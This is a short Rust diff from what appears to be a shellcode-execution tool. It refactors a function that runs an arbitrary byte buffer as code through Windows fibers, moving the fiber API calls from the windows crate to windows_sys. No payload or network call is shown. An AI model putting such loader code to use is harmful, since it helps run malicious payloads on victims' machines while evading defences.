@@ -43,10 +43,12 @@ pub fn shellcode_execute_default(bytes_to_load: Vec<u8>) -> bool {
 // =======================================================================================================
 
 #[cfg(feature = "ShellcodeExecuteFiber")]
-use windows::Win32::System::Threading::{
+use windows_sys::Win32::System::Threading::{
     ConvertThreadToFiber, CreateFiber, DeleteFiber, SwitchToFiber,
-    LPFIBER_START_ROUTINE,
 };
+
+#[cfg(feature = "ShellcodeExecuteFiber")]
+type LPFIBER_START_ROUTINE = unsafe extern "system" fn(*mut c_void);
 
 #[cfg(feature = "ShellcodeExecuteFiber")]
 struct Fiber {
@@ -76,15 +78,15 @@ pub fn shellcode_execute_fiber(bytes_to_load: Vec<u8>) -> bool {
                 let mut fiber: Fiber = std::mem::zeroed();
                 fiber.shellcode_fiber_address = CreateFiber(
                     0, 
-                    std::mem::transmute::<*mut c_void, LPFIBER_START_ROUTINE>(base_address), 
-                    None
+                    Some(std::mem::transmute::<*mut c_void, LPFIBER_START_ROUTINE>(base_address)), 
+                    null_mut()
                 );
                 if fiber.shellcode_fiber_address.is_null() {
                     return false;
                 }
                 
                 // Convert current thread to fiber
-                fiber.primary_fiber_address = ConvertThreadToFiber(None);
+                fiber.primary_fiber_address = ConvertThreadToFiber(null_mut());
                 if fiber.primary_fiber_address.is_null() {
                     return false;
                 }
